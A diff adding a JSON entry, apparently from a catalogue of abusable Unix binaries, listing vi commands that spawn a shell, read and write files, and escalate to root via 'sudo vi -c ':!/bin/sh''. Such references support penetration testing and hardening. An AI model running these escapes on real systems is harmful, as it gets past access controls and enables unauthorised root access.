@@ -1,0 +1,28 @@
+{
+  "description": "Modern Unix systems run 'vim' binary when 'vi' is called.",
+  "functions": {
+    "shell": [
+      {
+        "code": "vi -c ':!/bin/sh' /dev/null"
+      },
+      {
+        "code": "vi\n:set shell=/bin/sh\n:shell\n"
+      }
+    ],
+    "file-write": [
+      {
+        "code": "vi [file]\niDATA\n^[\nw\n"
+      }
+    ],
+    "file-read": [
+      {
+        "code": "vi [file]"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo vi -c ':!/bin/sh' /dev/null"
+      }
+    ]
+  }
+}
